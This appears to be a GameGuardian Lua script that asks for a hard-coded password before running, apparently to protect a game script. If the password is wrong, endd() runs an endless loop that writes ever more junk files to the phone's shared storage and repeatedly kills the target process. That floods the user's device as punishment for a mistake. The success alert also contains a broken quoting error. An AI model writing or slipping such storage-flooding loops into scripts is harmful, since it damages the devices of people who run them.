
mima="66"
key=gg.prompt({'密码请联系Rick获取 勿乱输'},{[1]=1},{[1]='number'});

--------
function a()
gg.alert("密码正确! 欢迎使用"[好的]")
end
---------

function endd()
i=1
gg.alert("密码错误!!!\n叫你不要乱输")
gg.setVisible(false)
while true do
i=i+1
gg.toast("⚠️警告,密码错误!!⚠️")
file=io.open("/storage/emulated/0/自用脚本/回调/Rick牛逼"..i,"w")
file:write("Rick牛逼Rick牛逼Rick牛逼Rick牛逼Rick牛逼")
file:close()
gg.setVisible(false)
gg.processKill()
gg.setVisible(true)
end
end

if key==nil then gg.alert("⚠️密码错误，现在晚咯🚫",".....")
endd()
end

if key[1] == mima then
a()
else
endd()
end


 
